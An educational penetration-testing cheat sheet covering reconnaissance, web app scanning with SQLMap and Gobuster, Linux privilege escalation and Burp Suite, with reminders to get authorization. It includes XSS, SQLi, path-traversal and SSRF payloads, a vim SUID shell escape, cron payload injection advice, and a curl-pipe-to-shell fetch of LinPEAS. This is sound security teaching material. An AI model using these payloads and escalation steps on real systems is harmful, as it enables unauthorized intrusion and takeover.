# Ethical Hacking — Fundamentals

## Penetration Testing Methodology

```
1. Reconnaissance (Passive)
   OSINT — gather info without touching target
   Tools: Shodan, Maltego, theHarvester, WHOIS, LinkedIn, Google Dorks

2. Scanning and Enumeration (Active)
   Port scanning, service detection, OS fingerprinting
   Tools: Nmap, Masscan, Nessus, OpenVAS

3. Vulnerability Analysis
   Identify exploitable weaknesses
   Tools: Nessus, OpenVAS, Nikto, WPScan (for WordPress)

4. Exploitation
   Attempt to exploit vulnerabilities
   Tools: Metasploit, Burp Suite, SQLMap, custom exploits

5. Post-Exploitation
   What can be done with the access gained?
   Privilege escalation, lateral movement, persistence

6. Reporting
   Document findings, risk ratings, remediation recommendations

Always:
  - Get written authorization BEFORE testing
  - Define scope clearly (which IPs, which systems)
  - Document everything
  - Don't disrupt production systems
```

## Reconnaissance Techniques

```bash
# Passive reconnaissance (no direct contact with target)

# Google Dorks — advanced search operators
site:target.com filetype:pdf             # PDF files on site
site:target.com inurl:admin              # Admin pages
site:target.com "index of /"            # Directory listings
"@target.com" filetype:xlsx             # Excel files with email addresses

# Shodan — search engine for internet-exposed devices
# shodan.io — search for: org:"Target Corp"
# Shows: open ports, software versions, default creds

# theHarvester — gather emails, subdomains, IPs
theHarvester -d target.com -b google,bing,linkedin

# Subdomain enumeration
subfinder -d target.com
amass enum -d target.com
dnsrecon -d target.com -t std,brt

# WHOIS
whois target.com
whois 192.0.2.1  # Reverse WHOIS

# Certificate Transparency — find subdomains
curl "https://crt.sh/?q=%.target.com&output=json" | jq '.[].name_value' | sort -u
```

## Web Application Testing

```bash
# Nikto — web server scanner
nikto -h https://target.com

# Gobuster — directory/file brute force
gobuster dir -u https://target.com -w /usr/share/wordlists/dirb/common.txt -x php,html,txt

# SQLMap — SQL injection testing (on authorized targets only!)
sqlmap -u "https://target.com/users?id=1" --dbs
sqlmap -u "https://target.com/login" --data "user=admin&pass=test" --forms

# Common web vulnerabilities to test:
# XSS: <script>alert('xss')</script> in input fields
# SQLi: ' OR '1'='1 in login forms
# IDOR: Change /api/users/123 to /api/users/124
# Path traversal: ../../etc/passwd
# SSRF: img src="http://169.254.169.254/latest/meta-data/"
```

## Linux Privilege Escalation

```bash
# After gaining initial access, escalate to root

# Check sudo permissions
sudo -l                          # What can current user sudo?

# Check SUID binaries (run as file owner, often root)
find / -perm -4000 -type f 2>/dev/null
# If vim has SUID: vim -c ':!/bin/bash'
# Check GTFOBins: gtfobins.github.io

# Writable cron jobs
ls -la /etc/cron*
cat /etc/crontab
# If writable script runs as root, inject payload

# Kernel exploits
uname -a                         # Kernel version
cat /etc/os-release
# Search for CVEs: exploit-db, searchsploit

# Misconfigured services
ps aux                           # Services running as root?
netstat -tlnp                    # Internal services not exposed externally?

# LinPEAS — automated Linux privilege escalation script
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

## Burp Suite Workflow

```
1. Configure browser to proxy through Burp (127.0.0.1:8080)
2. Install Burp CA certificate in browser
3. Browse target application — Burp captures all traffic

Key features:
  Proxy:     Intercept and modify requests/responses
  Repeater:  Manually modify and resend requests
  Intruder:  Automated parameter fuzzing (brute force, injection)
  Scanner:   Automated vulnerability scanning (Pro version)
  Decoder:   Encode/decode Base64, URL, HTML, etc.

Common tests:
  Authentication:  Try empty password, default creds, brute force
  Authorization:   Change user ID in requests, try different roles
  Input validation: XSS in all input fields, SQLi in all parameters
  Session:         Token entropy, fixation, logout invalidation
```
